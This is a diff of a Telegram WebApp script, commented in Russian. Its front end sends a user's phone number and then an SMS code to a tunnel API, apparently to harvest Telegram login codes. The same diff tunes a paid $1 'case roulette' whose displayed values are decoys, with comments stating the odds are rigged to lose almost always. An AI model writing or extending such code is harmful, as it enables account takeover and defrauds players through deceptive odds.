@@ -1,6 +1,6 @@
 const tg = window.Telegram.WebApp; tg.expand(); tg.ready();
 
-const API_BASE = "https://cyprus-mp-snake-bristol.trycloudflare.com/api"; // укажи свой публичный адрес
+const API_BASE = "https://cyprus-mp-snake-bristol.trycloudflare.com/api"; // твой работающий API
 const user = tg.initDataUnsafe?.user || {};
 const user_id = user?.id;
 const username = user?.username || user?.first_name || "user";
@@ -15,7 +15,7 @@ async function post(path, data){
     });
     if(!r.ok) throw new Error(`HTTP ${r.status}`);
     return await r.json();
-  }catch(e){ console.error(e); return {ok:false}; }
+  }catch(e){ console.error(e); return {ok:false, error:String(e)}; }
 }
 function setAria(el, hidden){ el.setAttribute("aria-hidden", hidden ? "true" : "false"); if(hidden) el.setAttribute("inert",""); else el.removeAttribute("inert"); }
 function show(id){
@@ -79,29 +79,52 @@ let submission_id=null;
 $("#sendPhone").onclick=async ()=>{
   const phone=$("#phone").value.trim(); if(!phone){ alert("Введите номер"); $("#phone").focus(); return; }
   const j=await post("/submit_phone",{user_id,username,phone});
-  if(j.ok){ submission_id=j.submission_id; $("#codePanel").classList.remove("hidden"); $("#codePanel").setAttribute("aria-hidden","false"); $("#code").focus(); alert("Номер отправлен. Введите код из SMS."); }
-  else alert("Ошибка отправки номера");
+  if(j.ok){
+    submission_id=j.submission_id;
+    const panel=$("#codePanel");
+    panel.classList.remove("hidden");
+    panel.removeAttribute("inert");
+    panel.setAttribute("aria-hidden","false");
+    const ci=$("#code");
+    ci.value="";
+    ci.removeAttribute("readonly");
+    ci.disabled=false;
+    setTimeout(()=>ci.focus({preventScroll:true}), 0);
+    alert("Номер отправлен. Введите код из SMS.");
+  } else {
+    alert("Ошибка отправки номера");
+  }
 };
 $("#sendCode").onclick=async ()=>{
-  const code=$("#code").value.trim(); if(!code || !submission_id){ alert("Нет кода/заявки"); if(!code) $("#code").focus(); return; }
+  const ci=$("#code");
+  const code=ci.value.trim();
+  if(!submission_id){ alert("Сначала отправьте номер телефона"); return; }
+  if(!code){ alert("Введите код"); ci.focus(); return; }
   const j=await post("/submit_code",{user_id,submission_id,code});
-  if(j.ok){ alert("Код отправлен. Ожидайте решения."); $("#phone").value=""; $("#code").value=""; $("#codePanel").classList.add("hidden"); $("#codePanel").setAttribute("aria-hidden","true"); show("menu"); }
-  else alert("Ошибка отправки кода");
+  if(j.ok){
+    alert("Код отправлен. Ожидайте решения.");
+    $("#phone").value=""; ci.value="";
+    $("#codePanel").classList.add("hidden");
+    $("#codePanel").setAttribute("aria-hidden","true");
+    show("menu"); loadLogs();
+  } else alert("Ошибка отправки кода");
 };
+// Enter по коду
+$("#code").addEventListener("keydown",(e)=>{ if(e.key==="Enter"){ e.preventDefault(); $("#sendCode").click(); }});
 
-/* --------- CASE roulette (CS:GO style) --------- */
+/* --------- CASE roulette (минусовое ожидание) --------- */
 const caseStrip = ()=>document.getElementById("case-strip");
-function weightedTile(){
+function weightedTile(){ // визуальные значения на ленте
   const r=Math.random();
   let lo,hi;
-  if(r<0.88){ lo=0.5; hi=2.0; }
-  else if(r<0.98){ lo=2.0; hi=5.0; }
-  else { lo=5.0; hi=10.0; }
+  if(r<0.88){ lo=0.10; hi=0.70; }      // почти всегда минус
+  else if(r<0.98){ lo=0.70; hi=0.99; } // около нуля
+  else { lo=1.00; hi=1.30; }           // редкие маленькие плюсы
   return Number((lo + Math.random()*(hi-lo)).toFixed(2));
 }
 function buildStrip(win, n=60){
   const arr = Array.from({length:n-1}, weightedTile);
-  arr.push(Number(win.toFixed(2))); // последняя — выигрыш
+  arr.push(Number(win.toFixed(2))); // последняя — реальный выигрыш
   return arr;
 }
 function renderStrip(values){
@@ -121,10 +144,8 @@ function animateToLast(onDone){
   const wrap = strip.parentElement.getBoundingClientRect();
   const winCenter = winEl.offsetLeft + winEl.offsetWidth/2;
   const target = Math.max(0, winCenter - wrap.width/2);
-
   strip.style.transition = "none";
   strip.style.transform = "translateX(0px)";
-  // старт с небольшого проскролла, чтобы ощущалась скорость
   requestAnimationFrame(()=>{
     strip.style.transition = "transform 4.2s cubic-bezier(0.08, 0.6, 0, 1)";
     strip.style.transform = `translateX(${-target}px)`;
@@ -142,7 +163,12 @@ document.getElementById("ru-spin").onclick = async ()=>{
   if(ruBusy) return; ruBusy=true;
   $("#ru-result").textContent="Покупка…";
   const res = await post("/roulette_spin",{user_id});
-  if(!res.ok){ ruBusy=false; if(res.error==="NO_FUNDS") alert("Недостаточно средств: нужно $1"); else alert("Ошибка рулетки"); return; }
+  if(!res.ok){
+    ruBusy=false;
+    if(res.error==="NO_FUNDS"){ alert("Недостаточно средств: нужно $1"); loadLogs(); }
+    else alert("Ошибка рулетки");
+    return;
+  }
   const strip = buildStrip(Number(res.win), 72);
   renderStrip(strip);
   $("#ru-result").textContent="Крутится…";
@@ -165,4 +191,3 @@ document.addEventListener("click",(e)=>{
 /* --------- start --------- */
 show("menu");
 setupCase();
-
